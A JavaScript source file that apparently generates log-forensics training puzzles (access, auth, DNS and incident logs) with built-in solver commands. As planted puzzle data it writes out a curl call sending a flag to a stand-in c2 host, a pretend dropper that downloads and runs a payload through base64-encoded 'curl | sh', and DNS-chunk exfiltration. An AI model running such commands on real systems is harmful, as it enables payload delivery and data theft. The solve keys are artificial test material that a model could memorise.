'use strict';
const U = require('./util');
const { GH, pad, iso, hmsOf, ip, pubip, WORDS, NAMES, PATHS, word, uniqWords, text, readme, noiseLine, b64, hexs } = U;

const fam = [];
const tierBy = (a, b) => (lv, n) => (lv <= a ? 2 : lv <= b ? 3 : 4);
const uniqSecs = (r, n) => { const s = new Set(); while (s.size < n) s.add(r.int(0, 86399)); return [...s].sort((a, b) => a - b); };
// a list of values with strictly decreasing weights so "the most common" is never a tie
const weighted = (r, vals, base, step) => { const out = []; vals.forEach((v, i) => { for (let k = 0; k < base + (vals.length - i) * step; k++) out.push(v); }); return r.shuffle(out); };

/* ---------------- weblog ---------------- */
fam.push({
  id: 'weblog', title: "The Chronicle Inquest", cat: 'Logs', levels: 40, tier: (lv) => (lv <= 14 ? 2 : lv <= 28 ? 3 : 4), type: (lv) => (lv % 5 === 3 ? 'flag' : 'answer'),
  blurb: 'Read access logs like an analyst: status codes, top talkers, odd requests.',
  brief: () => 'access.log lines look like: ip user [time] METHOD path status bytes. The README asks one question about it. Answer it with grep, cut, sort, uniq and awk.',
  build: (c, lv) => {
    const r = c.rnd, v = lv % 5, N = 150 + lv * 18, L = [], pool = Array.from({ length: 12 + Math.floor(lv / 2) }, () => pubip(r));
    const lookalike = lv > 14;
    const mk = (ipx, path, st, method, bytes) => ipx + ' ' + r.pick(['-', '-', '-', 'alice', 'bob']) + ' [' + U.hmsOf(r.int(0, 86399)) + '] ' + (method || 'GET') + ' ' + path + ' ' + (st || r.pick([200, 200, 200, 301, 304, 404])) + ' ' + (bytes || r.int(1000, 99999));
    let answer, ask, meta = {};
    const base = []; for (let i = 0; i < N; i++) base.push(mk(r.pick(pool), r.pick(PATHS), null, r.pick(['GET', 'GET', 'POST'])));
    // strip accidental accidents so the planted facts are exact
    let rows = base.filter((l) => l.indexOf(' /login ') < 0);
    if (v === 0) {
      const n404 = r.int(15, 60); rows = rows.filter((l) => l.split(' ')[5] !== '404');
      for (let i = 0; i < n404; i++) rows.push(mk(r.pick(pool), r.pick(PATHS), 404));
      answer = n404; ask = 'How many requests got status 404?';
    } else if (v === 1) {
      const top = r.shuffle(pool.slice()).slice(0, 4); const ws = [25, 18, 12, 8];
      top.forEach((t, i) => { for (let k = 0; k < ws[i] + lv % 4; k++) rows.push(mk(t, '/login')); });
      if (lookalike) for (let k = 0; k < 40; k++) rows.push(mk(top[3], r.pick(['/login.php', '/admin/login', '/login-help'])));
      answer = top[0]; ask = 'Which IP sent the most requests to exactly /login ? (not /login.php, not /admin/login)';
    } else if (v === 2) {
      const p = '/' + word(r) + '/' + word(r); rows = rows.filter((l) => !(l.indexOf(' POST ') >= 0 && l.indexOf(' 500 ') >= 0));
      rows.push(mk(r.pick(pool), p, 500, 'POST'));
      for (let i = 0; i < 12 + lv; i++) rows.push(mk(r.pick(pool), r.pick(PATHS), 500, 'GET'));
      for (let i = 0; i < 12 + lv; i++) rows.push(mk(r.pick(pool), r.pick(PATHS), 200, 'POST'));
      answer = p; ask = 'Exactly one request was a POST that ended in status 500. Which path was it?';
    } else if (v === 3) {
      rows.push(mk(r.pick(pool), '/api/debug?token=' + c.flag, 200, 'GET'));
      for (let i = 0; i < 20; i++) rows.push(mk(r.pick(pool), '/api/debug?mode=' + r.hex(6), 200, 'GET'));
      ask = 'Someone leaked a token in a query string. Find the request with token=flag{...}.';
    } else {
      const who = r.pick(pool); rows = rows.filter((l) => l.split(' ')[0] !== who); let sum = 0;
      for (let i = 0; i < 6 + Math.floor(lv / 4); i++) { const b = r.int(1000, 99999); sum += b; rows.push(who + ' - [' + hmsOf(r.int(0, 86399)) + '] GET ' + r.pick(PATHS) + ' 200 ' + b); }
      meta.who = who; answer = sum; ask = 'How many bytes in total were sent to ' + who + '?';
    }
    rows = r.shuffle(rows);
    return { motd: 'An access log. Ask it the right question.', hosts: { main: { name: 'arena', files: Object.assign(readme(ask + (v === 3 ? '' : '\nSubmit just the answer.')), { '/var/log/access.log': text(rows) }) } }, answer: answer === undefined ? undefined : String(answer), meta: Object.assign({ v }, meta, { top: answer }) };
  },
  solve: (b) => [["grep -c ' 404 ' /var/log/access.log", "grep ' /login ' /var/log/access.log | cut -d' ' -f1 | sort | uniq -c | sort -nr | head -n 1", "grep ' POST ' /var/log/access.log | grep ' 500 '", 'grep token= /var/log/access.log', "grep '^" + (b.meta.who || '') + " ' /var/log/access.log | awk '{s+=$7} END {print s}'"][b.meta.v]]
});

/* ---------------- authlog ---------------- */
fam.push({
  id: 'authlog', title: "Gatekeeper's Reckoning", cat: 'Logs', levels: 40, tier: (lv) => (lv <= 14 ? 2 : lv <= 28 ? 3 : 4), type: (lv) => (lv % 5 === 4 ? 'flag' : 'answer'),
  blurb: 'Brute force, lucky guesses and sudo: read the story in auth.log.',
  brief: () => 'auth.log is an sshd and sudo log. The README asks one question. Failed attempts, accepted logins and sudo lines all live in the same file.',
  build: (c, lv) => {
    const r = c.rnd, v = lv % 5, N = 100 + lv * 14, users = r.shuffle(NAMES.slice(0, 20)).slice(0, 8 + Math.floor(lv / 5)), L = [];
    const att = pubip(r), others = Array.from({ length: 30 }, () => pubip(r));
    const line = (sec, msg, svc) => 'Nov 26 ' + hmsOf(sec) + ' arena ' + (svc || 'sshd') + '[' + r.int(1000, 9999) + ']: ' + msg;
    const acc = (sec, u, i) => line(sec, 'Accepted password for ' + u + ' from ' + i + ' port ' + r.int(20000, 60000) + ' ssh2');
    const fail = (sec, u, i) => line(sec, 'Failed password for ' + u + ' from ' + i + ' port ' + r.int(20000, 60000) + ' ssh2');
    const secs = uniqSecs(r, 4 * N), ev = [];
    let si = 0; const T = () => secs[si++];
    for (let i = 0; i < N; i++) ev.push([T(), r.int(0, 3) ? fail : acc, r.pick(users), r.pick(others)]);
    let answer, ask, meta = { att, v };
    const rows = ev.map((e) => ({ s: e[0], t: e[1] === fail ? fail(e[0], e[2], e[3]) : acc(e[0], e[2], e[3]) }));
    const push = (s, t) => rows.push({ s, t });
    if (v === 0) {
      const w = [60, 36, 20, 10]; const ips = [att].concat(others.slice(0, 3));
      ips.forEach((x, i) => { for (let k = 0; k < w[i] + (lv % 7); k++) push(T(), fail(0, r.pick(users), x)); });
      answer = att; ask = 'Which IP address had the most failed password attempts?';
    } else if (v === 1) {
      const win = r.pick(users); for (let k = 0; k < 30 + lv; k++) push(T(), fail(0, r.pick(users), att));
      push(T(), acc(0, win, att)); answer = win; meta.win = win;
      ask = 'The attacker is ' + att + '. After the failures, one account was accepted from that IP. Which user?';
    } else if (v === 2) {
      const tried = uniqWords(r, 6 + (lv % 9)).map((x) => x.replace('-', '')); tried.forEach((u) => { for (let k = 0; k < 2 + (lv % 3); k++) push(T(), fail(0, u, att)); });
      answer = tried.length; ask = 'How many different user names did ' + att + ' try?';
    } else if (v === 3) {
      const target = r.pick(users); const idx = rows.filter((x) => x.t.indexOf('for ' + target + ' ') >= 0 && x.t.indexOf('Accepted') >= 0);
      const s1 = T(); const first = Math.min.apply(null, idx.map((x) => x.s).concat([s1]));
      if (!idx.length || s1 < first) { push(s1, acc(0, target, r.pick(others))); } // guarantee at least one
      const all = rows.filter((x) => x.t.indexOf('Accepted password for ' + target + ' ') >= 0).map((x) => x.s).sort((a, b) => a - b);
      answer = hmsOf(all[0]); meta.target = target; ask = 'At what time (HH:MM:SS) did ' + target + ' first log in successfully?';
    } else {
      const adm = r.pick(users);
      users.forEach((u) => { for (let k = 0; k < 3; k++) push(T(), line(0, u + ' : TTY=pts/0 ; PWD=/home/' + u + ' ; USER=root ; COMMAND=/usr/bin/' + r.pick(['apt', 'systemctl', 'journalctl', 'cat']) + ' ' + r.pick(['update', 'status ssh', '-n 20', '/etc/hosts']), 'sudo')); });
      meta.who = r.pick(users.filter((u) => u !== adm)); rows.filter((x) => x.t.indexOf(' sudo[') >= 0 && x.t.indexOf(' ' + meta.who + ' :') >= 0).forEach((x) => { x.t = x.t.replace(/COMMAND=.*/, 'COMMAND=/bin/echo done'); });
      push(T(), line(0, meta.who + ' : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://c2.example/?k=' + c.flag, 'sudo'));
      ask = meta.who + ' ran something odd with sudo. Find the flag in that command.';
    }
    rows.sort((a, b) => a.s - b.s);
    // sudo lines were built with time 0; give them real ones in order
    const out = rows.map((x, i) => x.t).map((t) => t);
    const fixed = rows.map((x) => x.t.replace(/^Nov 26 00:00:00 /, 'Nov 26 ' + hmsOf(r.int(0, 86399)) + ' '));
    // restore chronological order after fixing zero times
    const withT = fixed.map((t) => ({ t, k: t.slice(7, 15) })).sort((a, b) => (a.k < b.k ? -1 : a.k > b.k ? 1 : 0));
    // recompute the "first login" answer from the final text so it is always exact
    if (v === 3) { const tt = withT.filter((x) => x.t.indexOf('Accepted password for ' + meta.target + ' ') >= 0); answer = tt[0].k; }
    return { motd: 'A busy server with an unwelcome guest.', hosts: { main: { name: 'arena', files: Object.assign(readme(ask), { '/var/log/auth.log': text(withT.map((x) => x.t)) }) } }, answer: answer === undefined ? undefined : String(answer), meta };
  },
  solve: (b) => {
    const m = b.meta;
    return [["grep Failed /var/log/auth.log | grep -o 'from [0-9.]*' | sort | uniq -c | sort -nr | head -n 1", 'grep Accepted /var/log/auth.log | grep ' + m.att, "grep 'from " + m.att + " ' /var/log/auth.log | grep -o 'for [a-z0-9]*' | sort -u | wc -l", 'grep Accepted /var/log/auth.log | grep "for ' + m.target + ' " | head -n 1', 'grep sudo /var/log/auth.log | grep "' + m.who + ' :"'][m.v]];
  }
});

/* ---------------- timeline ---------------- */
fam.push({
  id: 'timeline', title: "Annals of Treason", cat: 'Forensics', levels: 30, tier: (lv) => (lv <= 15 ? 3 : 4), type: 'answer',
  blurb: 'Merge logs from several systems and reason about order.',
  brief: () => 'Four systems each wrote their own log. Timestamps are ISO, so sorting text sorts time. Merge them with cat and sort, then answer the README question.',
  build: (c, lv) => {
    const r = c.rnd, v = lv % 3, srcs = ['web', 'db', 'cache', 'auth'], files = {}, N = 30 + lv * 6, all = [];
    const secs = uniqSecs(r, N * 4); let si = 0; const used = r.shuffle(secs);
    srcs.forEach((s) => { const L = []; for (let i = 0; i < N; i++) { const sec = used[si++]; const err = r.int(0, 5) === 0; const l = iso(sec) + ' ' + (err ? 'ERROR code=E-' + r.int(1000, 9999) : 'INFO ' + r.pick(['ok', 'tick', 'hit', 'miss'])) + ' ' + s; L.push(l); all.push({ sec, l, err }); } files['/var/log/tl/' + s + '.log'] = text(L.sort()); });
    const errs = all.filter((x) => x.err).sort((a, b) => a.sec - b.sec); let ans, ask;
    const code = (x) => /E-\d+/.exec(x.l)[0];
    if (v === 0) { ans = code(errs[0]); ask = 'What is the error code of the EARLIEST ERROR across all four logs?'; }
    else if (v === 1) { ans = code(errs[errs.length - 1]); ask = 'What is the error code of the LATEST ERROR across all four logs?'; }
    else { const h = r.pick(['0', '1', '2']) + r.pick(['0', '1', '2', '3']); ans = String(errs.filter((x) => x.l.slice(11, 13) === h).length); ask = 'How many ERROR events happened during hour ' + h + ' (timestamps starting 2026-11-26T' + h + ')?'; var HH = h; }
    return { motd: 'Four clocks, one story.', hosts: { main: { name: 'arena', files: Object.assign(readme(ask), files) } }, answer: ans, meta: { v, HH } };
  },
  solve: (b) => ['cat /var/log/tl/web.log /var/log/tl/db.log /var/log/tl/cache.log /var/log/tl/auth.log | grep ERROR | sort' + ['| head -n 1', '| tail -n 1', ''][b.meta.v] ].map((x, i) => (b.meta.v === 2 ? 'cat /var/log/tl/web.log /var/log/tl/db.log /var/log/tl/cache.log /var/log/tl/auth.log | grep ERROR | grep -c T' + b.meta.HH : x))
});

/* ---------------- agents ---------------- */
const UAS = ['Firefox/124.0', 'Chrome/121.0', 'Safari/17.2', 'Edge/120.0', 'Opera/106.0', 'curl/8.4.0', 'python-requests/2.31', 'Googlebot/2.1', 'bingbot/2.0', 'Slackbot/1.0', 'okhttp/4.12', 'Wget/1.21', 'Go-http-client/2.0', 'axios/1.6'];
fam.push({
  id: 'agents', title: "Heraldry of Strangers", cat: 'Logs', levels: 25, tier: (lv) => (lv <= 12 ? 2 : 3), type: (lv) => (lv % 5 === 3 ? 'flag' : 'answer'),
  blurb: 'Browsers, bots and scanners all announce themselves. Read their names.',
  brief: () => 'agents.log has two columns: client ip, then user agent. Answer the README question.',
  build: (c, lv) => {
    const r = c.rnd, v = lv % 5, N = 120 + lv * 10, L = []; let ans, ask, scanner;
    if (v === 0) {
      const set = r.shuffle(UAS.filter((u) => !/bot|curl|Wget/.test(u))).slice(0, 5); weighted(r, set, 8, 14).forEach((u) => L.push(pubip(r) + ' ' + u)); ans = set[0]; ask = 'Which user agent appears most often?';
    } else if (v === 1) {
      scanner = pubip(r); for (let i = 0; i < N; i++) L.push(pubip(r) + ' ' + r.pick(UAS)); for (let i = 0; i < 6 + (lv % 5); i++) L.push(scanner + ' ' + r.pick(['sqlmap/1.7.2', 'Nikto/2.5.0', 'sqlmap/1.7.2'])); r.shuffle(L); ans = scanner; ask = 'One address used a scanner (sqlmap or Nikto). Which IP?';
    } else if (v === 2) {
      const k = 4 + (lv % 8), set = r.shuffle(UAS.slice()).slice(0, k); for (let i = 0; i < N; i++) L.push(pubip(r) + ' ' + (i < k ? set[i] : r.pick(set))); ans = k; ask = 'How many different user agents appear?';
    } else if (v === 3) {
      for (let i = 0; i < N; i++) L.push(pubip(r) + ' ' + r.pick(UAS)); L.splice(r.int(5, N - 5), 0, pubip(r) + ' Probe/' + c.flag); ask = 'One client sent a Probe user agent carrying a flag.';
    } else {
      let n = 0; for (let i = 0; i < N; i++) { const u = r.pick(UAS); if (/bot/i.test(u)) n++; L.push(pubip(r) + ' ' + u); } ans = n; ask = 'How many requests came from bots? (user agents containing "bot", any capitalisation)';
    }
    return { motd: 'Everyone leaves a name tag.', hosts: { main: { name: 'arena', files: Object.assign(readme(ask), { '/var/log/agents.log': text(L) }) } }, answer: ans === undefined ? undefined : String(ans), meta: { v } };
  },
  solve: (b) => [["cut -d' ' -f2 /var/log/agents.log | sort | uniq -c | sort -nr | head -n 1", 'grep -E "sqlmap|Nikto" /var/log/agents.log | head -n 1', "cut -d' ' -f2 /var/log/agents.log | sort -u | wc -l", 'grep Probe /var/log/agents.log', 'grep -ci bot /var/log/agents.log'][b.meta.v]]
});

/* ---------------- dnslog ---------------- */
fam.push({
  id: 'dnslog', title: "Whispers in the Wells", cat: 'Forensics', levels: 30, tier: (lv) => (lv <= 10 ? 3 : lv <= 20 ? 4 : 5), type: 'flag',
  blurb: 'Data smuggled out inside DNS lookups. Reassemble it.',
  brief: (lv) => 'An attacker hid data in DNS queries to one domain, in chunks. Collect the queries for that domain, put the chunks in order, join them and decode.' + (lv > 20 ? ' The decoded text is itself encoded.' : ''),
  build: (c, lv) => {
    const r = c.rnd, dom = word(r) + '-' + r.hex(3) + '.test', lay = lv > 20;
    let payload = lay ? b64(c.flag) : c.flag; const hex = hexs(payload), size = 6 + 2 * r.int(0, 3), ch = [];
    for (let i = 0; i < hex.length; i += size) ch.push(hex.slice(i, i + size));
    const L = [], secs = uniqSecs(r, ch.length + 120); let si = 0;
    const ordered = lv <= 10;
    ch.forEach((x, i) => L.push({ s: secs[ordered ? si++ : r.int(0, 80000)], t: ' ' + ip(r) + ' A ' + pad(i) + '.' + x + '.' + dom }));
    for (let i = 0; i < 100 + lv * 3; i++) L.push({ s: r.int(0, 86399), t: ' ' + ip(r) + ' A ' + r.pick(['www', 'mail', 'api', 'cdn', 'login']) + '.' + r.pick(['corp', 'example', 'intra']) + '.test' });
    for (let i = 0; i < 8; i++) L.push({ s: r.int(0, 86399), t: ' ' + ip(r) + ' A ' + pad(r.int(0, 30)) + '.' + r.hex(8) + '.' + dom.replace('.test', '-cdn.test') });
    L.sort((a, b) => a.s - b.s);
    return { motd: 'Quiet traffic. Suspiciously quiet.', hosts: { main: { name: 'arena', files: Object.assign(readme('The suspicious domain is ' + dom + '\nEach query looks like: SEQ.HEXCHUNK.' + dom + '\nThe sequence number says the chunk order.' + (ordered ? '' : '\nThe log is not in order, so use the sequence number.')), { '/var/log/dns.log': text(L.map((x) => iso(x.s) + x.t)) }) } }, meta: { dom, lay } };
  },
  solve: (b) => ["grep ' " + '[0-9]*' + "' /var/log/dns.log >/dev/null", "grep '\\." + b.meta.dom.replace(/\./g, '\\.') + "$' /var/log/dns.log | cut -d' ' -f4 | sort -t. -k1 -n | cut -d. -f2 | tr -d '\\n' | xxd -r -p" + (b.meta.lay ? ' | base64 -d' : '')]
});

/* ---------------- malware ---------------- */
fam.push({
  id: 'malware', title: "Plague Physician's Rounds", cat: 'Forensics', levels: 25, tier: (lv) => (lv <= 12 ? 3 : 4), type: 'answer',
  blurb: 'A suspicious script is on disk. Read it safely and find where it phones home.',
  brief: () => 'sample.sh is a pretend dropper. It is never run here: you only read it. Find the domain it contacts (the C2). It may be hidden.',
  build: (c, lv) => {
    const r = c.rnd, v = lv % 5, dom = 'c2-' + r.hex(5) + '.test', L = ['#!/bin/sh', '# totally normal updater'];
    const junk = () => r.pick(['echo "updating..."', 'sleep ' + r.int(1, 9), 'rm -f /tmp/.' + r.hex(4), 'chmod +x /tmp/.' + r.hex(4), 'cd /tmp', 'id > /tmp/.' + r.hex(3)]);
    for (let i = 0; i < 6 + lv; i++) L.push(junk());
    let at = r.int(3, L.length - 1);
    if (v === 0) L.splice(at, 0, 'curl -s http://' + dom + '/drop.bin -o /tmp/.x');
    else if (v === 1) L.splice(at, 0, 'echo ' + b64('curl -s http://' + dom + '/drop.bin') + ' | base64 -d | sh');
    else if (v === 2) L.splice(at, 0, 'echo ' + hexs('http://' + dom + '/drop.bin') + ' | xxd -r -p');
    else if (v === 3) L.splice(at, 0, 'echo ' + U.revs('http://' + dom + '/drop.bin') + ' | rev');
    else { const parts = ['c2-', dom.slice(3, 8), '.test']; parts.forEach((p, i) => L.splice(at + i, 0, 'p' + (i + 1) + '=' + p)); L.splice(at + 4, 0, 'q1=decoy-' + r.hex(4) + '.test'); }
    return { motd: 'Do not run it. Read it.', hosts: { main: { name: 'arena', files: Object.assign(readme('Find the C2 domain (it looks like c2-xxxxx.test).\nSubmit just the domain.'), { [GH + '/sample.sh']: text(L) }) } }, answer: dom, meta: { v } };
  },
  solve: (b) => [['grep curl sample.sh', "grep base64 sample.sh | cut -d' ' -f2 | base64 -d", "grep xxd sample.sh | cut -d' ' -f2 | xxd -r -p", "grep rev sample.sh | cut -d' ' -f2 | rev", "grep '^p' sample.sh | cut -d= -f2 | tr -d '\\n'"][b.meta.v]]
});

/* ---------------- incident ---------------- */
fam.push({
  id: 'incident', title: "Fall of the Citadel", cat: 'Forensics', levels: 40, tier: (lv) => (lv <= 14 ? 4 : lv <= 28 ? 5 : 6), type: 'flag',
  blurb: 'Several logs, one trail. Follow the attacker from the first clue to the loot.',
  brief: () => 'Something was stolen. The README lists the steps of the investigation. Each step gives you the input for the next one. Follow the trail to the file with the flag.',
  build: (c, lv) => {
    const r = c.rnd, v = lv % 4, N = 80 + lv * 6, files = {}, users = NAMES.slice(0, 10);
    const att = pubip(r), noise = Array.from({ length: 6 }, () => pubip(r)), loot = word(r) + '-' + r.hex(4) + '.dat';
    const A = [], W = [], sec = uniqSecs(r, 4 * N + 40); let si = 0;
    const fl = (s, ipx) => 'Nov 26 ' + hmsOf(s) + ' arena sshd[' + r.int(1000, 9999) + ']: Failed password for ' + r.pick(users) + ' from ' + ipx + ' port ' + r.int(20000, 60000) + ' ssh2';
    const web = (s, ipx, path) => ipx + ' - [' + hmsOf(s) + '] GET ' + path + ' 200 ' + r.int(1000, 9999);
    for (let i = 0; i < N; i++) { A.push({ s: sec[si++], t: null, g: (s) => fl(s, r.pick(noise)) }); W.push({ s: sec[si++], g: (s) => web(s, r.pick(noise), r.pick(PATHS)) }); }
    let meta = { att, loot }, desc;
    const finalize = () => { const aa = A.sort((a, b) => a.s - b.s).map((x) => x.g(x.s)), ww = W.sort((a, b) => a.s - b.s).map((x) => x.g(x.s)); files['/var/log/auth.log'] = text(aa); files['/var/log/access.log'] = text(ww); };
    if (v === 0) {
      for (let k = 0; k < 50 + lv; k++) A.push({ s: sec[si++], g: (s) => fl(s, att) });
      for (let k = 0; k < 3; k++) W.push({ s: sec[si++] % 40000, g: (s) => web(s, att, '/srv/loot/' + word(r) + '-' + r.hex(4) + '.dat') });
      W.push({ s: 86000, g: (s) => web(s, att, '/srv/loot/' + loot) });
      files['/srv/loot/' + loot] = c.flag + '\n'; for (let k = 0; k < 6; k++) files['/srv/loot/' + word(r) + '-' + r.hex(4) + '.dat'] = 'decoy\n';
      desc = '1. Find the IP with the most failed logins in /var/log/auth.log.\n2. Find the LAST file that IP downloaded in /var/log/access.log (a path under /srv/loot).\n3. Read that file.';
      meta.cmds = ["grep Failed /var/log/auth.log | grep -o 'from [0-9.]*' | sort | uniq -c | sort -nr | head -n 1", 'grep ' + att + ' /var/log/access.log | tail -n 1', 'cat /srv/loot/' + loot];
    } else if (v === 1) {
      const win = r.pick(users);
      for (let k = 0; k < 40 + lv; k++) A.push({ s: sec[si++], g: (s) => fl(s, att) });
      A.push({ s: 86100, g: (s) => 'Nov 26 ' + hmsOf(s) + ' arena sshd[4242]: Accepted password for ' + win + ' from ' + att + ' port 40404 ssh2' });
      files['/home/' + win + '/.bash_history'] = text(['ls', 'cd /tmp', 'cat /opt/stash/' + loot, 'exit']); users.filter((u) => u !== win).forEach((u) => { files['/home/' + u + '/.bash_history'] = text(['ls', 'pwd', 'cat /opt/stash/' + word(r) + '-' + r.hex(4) + '.dat']); });
      files['/opt/stash/' + loot] = c.flag + '\n';
      desc = '1. The attacker is ' + att + '. Which user was accepted from that IP in /var/log/auth.log?\n2. Look at that user\'s /home/USER/.bash_history. One command reads a file in /opt/stash.\n3. Read that file.';
      meta.cmds = ['grep Accepted /var/log/auth.log | grep ' + att, 'cat /home/' + win + '/.bash_history', 'cat /opt/stash/' + loot]; meta.win = win;
    } else if (v === 2) {
      const when = sec[si++];
      files['/var/log/app.log'] = text([iso(when - 400) + ' INFO ok', iso(when - 200) + ' INFO ok', iso(when) + ' ERROR integrity check failed', iso(when + 90) + ' INFO ok']);
      W.push({ s: when, g: (s) => web(s, att, '/export') });
      files['/srv/quarantine/' + att + '.txt'] = c.flag + '\n'; for (let k = 0; k < 5; k++) files['/srv/quarantine/' + pubip(r) + '.txt'] = 'decoy\n';
      desc = '1. In /var/log/app.log find the time of the ERROR line (the HH:MM:SS part).\n2. In /var/log/access.log find the request logged at exactly that second. Note its IP.\n3. The file /srv/quarantine/IP.txt belongs to that IP. Read it.';
      meta.cmds = ['grep ERROR /var/log/app.log', 'grep "' + hmsOf(when) + '" /var/log/access.log', 'cat /srv/quarantine/' + att + '.txt']; meta.when = when;
    } else {
      const k = 20 + (lv % 30); for (let i = 0; i < k; i++) A.push({ s: sec[si++], g: (s) => fl(s, att) });
      files['/srv/archive/' + (k + 0) + '.txt'] = c.flag + '\n'; for (let i = 0; i < 9; i++) { const n = r.int(5, 120); if (n !== k) files['/srv/archive/' + n + '.txt'] = 'decoy\n'; }
      desc = '1. Count the failed logins from ' + att + ' in /var/log/auth.log.\n2. A file called /srv/archive/COUNT.txt holds the flag, where COUNT is that number.';
      meta.cmds = ['grep Failed /var/log/auth.log | grep -c ' + att, 'cat /srv/archive/' + k + '.txt'];
    }
    // the sort key for planted rows may collide with noise; accept: logs are ordered by time only
    finalize();
    return { motd: 'Follow the trail.', hosts: { main: { name: 'arena', files: Object.assign(readme(desc + '\nThe attacker leaves traces in more than one log.'), files) } }, meta };
  },
  solve: (b) => b.meta.cmds
});

module.exports = fam;
